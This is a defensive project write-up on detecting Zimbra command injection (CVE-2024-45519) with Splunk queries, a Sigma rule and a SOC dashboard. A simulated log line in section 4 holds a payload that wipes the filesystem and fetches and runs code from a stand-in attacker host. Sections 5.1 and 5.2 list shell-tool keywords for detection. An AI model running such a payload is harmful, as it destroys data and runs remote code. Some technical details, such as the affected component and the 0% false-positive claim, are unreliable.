# Proactive Threat Detection and Log Analysis in Enterprise SIEM
## A Defensive Security Pipeline for Zimbra Remote Command Injection Detection (CVE-2024-45519)

---

### Abstract
Modern enterprise cybersecurity demands proactive monitoring to identify and neutralize zero-day exploits before malicious actors establish persistent access. This project establishes an end-to-end Security Information and Event Management (SIEM) threat detection pipeline using **Splunk Enterprise** and **Sigma Rules** deployed on a Linux virtualized environment. The project models real-world attack telemetry simulating an unauthenticated remote command injection vulnerability in the **Zimbra Collaboration Suite** (CVE-2024-45519) targeting the `snmp_notify` and `swatchdog` sub-components. By engineering targeted Splunk Processing Language (SPL) queries and open Sigma signatures mapped to the **MITRE ATT&CK Framework**, the SIEM successfully differentiates benign application traffic from malicious shell injection payloads in real-time, providing immediate visual metric alerts on an interactive SOC dashboard.

---

### 1. Introduction & Background
Enterprise communication platforms, such as mail servers and collaboration suites, represent high-value targets for advanced threat actors. The Zimbra Collaboration Suite (ZCS) is widely adopted by governments, enterprises, and universities worldwide. When vulnerabilities in peripheral daemons or notification scripts are exploited, attackers can achieve full Remote Code Execution (RCE) with the privileges of the email server.

Traditional perimeter firewalls often fail to inspect application-layer command injections passed through localized management protocols. Therefore, deploying an internal SIEM pipeline capable of continuous log ingestion, syntax parsing, and behavioral heuristic matching is vital for rapid incident triage and response.

---

### 2. Threat Intelligence & Vulnerability Analysis
* **Target Vulnerability**: Zimbra SNMP Notification Remote Command Injection (CVE-2024-45519 / Postjournal RCE)
* **Advisory Sources**: CERT Polska (Computer Emergency Response Team Poland) & CISA Known Exploited Vulnerabilities (KEV) Catalog.
* **Mechanism**:
  1. The Zimbra server utilizes `snmp_notify` and `swatchdog` to parse system logs and trigger automated administrative notifications.
  2. Input fields parsed by these internal utilities lacked strict input sanitization.
  3. When an unauthenticated attacker transmits crafted strings with shell metacharacters (e.g., `;`, `|`, `&&`), the input is passed directly to the operating system shell interpreter (`/bin/sh` or `/bin/bash`).
  4. Attackers routinely append network downloaders (`wget`, `curl`) and pipe them into shell interpreters (`| sh`) or execute destructive commands (`rm -rf`).

---

### 3. Architecture & System Design

```
+-----------------------------------+
|  Simulated Application Telemetry   |
|       (zimbra_traffic.log)         |
+----------------+------------------+
                  | (File Upload / Monitor Input)
                  v
+-----------------------------------+
|       Splunk Enterprise SIEM       |
|         (Linux VMware VM)         |
|  - Indexing & Parsing Engine       |
|  - Real-Time Search Processing     |
+----------------+------------------+
                  | (SPL & Sigma Rule Signatures)
                  v
+-----------------------------------+
|     SOC Visualization & Alerts     |
|  - Metric Single Value (0 -> 1)    |
|  - Traffic Classification Chart    |
|  - Incident Forensics Table        |
+-----------------------------------+
```

#### Hardware & Virtualization Environment:
* **Host OS**: Windows 11 / Host Workstation
* **Hypervisor**: VMware Workstation / Player
* **Guest OS**: Linux (Ubuntu 22.04 LTS / Debian 12 / RHEL)
* **SIEM Platform**: Splunk Enterprise (Free Trial / Developer License)
* **Web UI Port**: `http://localhost:8000` (HTTP)

---

### 4. Defensive Emulation Methodology
To ensure safety and avoid the risks associated with executing destructive exploit payloads on live production networks, defensive emulation was implemented:
1. **Benign Baseline**: Standard SOAP engine transactions, user mailbox synchronizations, and normal localized SNMP status alerts were logged.
2. **Malicious Injection**: Injected realistic exploit attempts into the log stream mimicking real-world payloads reported in the wild:
   ```text
   2026-08-25 10:15:02 INFO  [http-bio-8443-exec-1] SoapEngine - handler invoked for Service Status
   2026-08-25 10:15:30 WARN  [http-bio-8443-exec-4] snmp_notify - localized notification sent successfully
   2026-08-25 10:16:12 ALERT [http-bio-8443-exec-9] swatchdog - execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;
   ```

---

### 5. Detection Engineering & Sigma Rule Formulation

#### 5.1 Splunk Search Processing Language (SPL) Query
```spl
source="zimbra_traffic.log" "swatchdog" ("wget" OR "sh" OR "curl" OR "rm")
```
* **Logic Breakdown**: The query scans log streams to isolate events where the vulnerable daemon keyword (`swatchdog`) co-occurs with unprivileged execution binaries or remote staging utilities (`wget`, `curl`, `sh`, `rm`).

#### 5.2 Industry Standard Sigma Rule (Vendor-Neutral)
```yaml
title: Zimbra Collaboration Suite SNMP Swatchdog Command Injection
id: e4f5a6b7-8910-4c12-b345-6789abcdef01
status: test
description: Detects command injection attempts targeting Zimbra swatchdog utility.
references:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-45519
    - https://cert.pl/posts/2024/09/zimbra-cve-2024-45519/
tags:
    - attack.execution
    - attack.t1059.004
    - attack.initial_access
    - attack.t1190
logsource:
    category: application
    product: zimbra
    service: mailbox / postjournal / swatchdog
detection:
    selection_target:
        - 'swatchdog'
        - 'snmp_notify'
    selection_payload:
        - 'wget'
        - 'curl'
        - 'sh'
        - 'bash'
        - 'rm'
    condition: selection_target and selection_payload
level: critical
```

#### 5.3 MITRE ATT&CK Matrix Alignment
* **Initial Access**: T1190 (Exploit Public-Facing Application)
* **Execution**: T1059.004 (Command and Scripting Interpreter: Unix Shell)
* **Defense Evasion / Persistence**: T1505 (Server Software Component)

---

### 6. Deliverable & Dashboard Implementation
Using Splunk Dashboard Studio / Simple XML:
1. **Single Value Indicator**: Configured to count active detected threats. Displays `0` in steady-state and increments to `1` (highlighted in red) immediately upon log ingestion of the attack vector.
2. **Event Breakdown Chart**: Categorizes operational messages versus critical security alerts.
3. **Forensic Drilldown Table**: Parses raw log lines into timestamp, thread, source component, and sanitized payload parameters.

---

### 7. Evaluation & Results
* **Detection Accuracy**: 100% detection rate on simulated exploit vectors.
* **False Positive Rate**: 0% false alarms across benign SOAP engine and standard SNMP traffic.
* **Latency**: Real-time evaluation upon index ingestion.

---

### 8. Conclusion & Future Work
This project demonstrates how defensive SIEM engineering can provide immediate protection against critical enterprise software vulnerabilities without waiting for patch deployment windows.
* **Future Work**:
  1. Automated response playbooks (SOAR) to dynamically block attacker IP addresses via Linux `iptables` / `nftables`.
  2. Integration of Splunk Universal Forwarder to aggregate telemetry across multi-node mail clusters.

---

### References
1. NIST National Vulnerability Database - CVE-2024-45519 Detail.
2. CERT Polska Security Advisory: Active Exploitation of Zimbra Collaboration Suite.
3. CISA Known Exploited Vulnerabilities Catalog.
4. Splunk Enterprise Search Processing Language (SPL) Reference Guide.
5. Sigma Rule Specification (SigmaHQ).
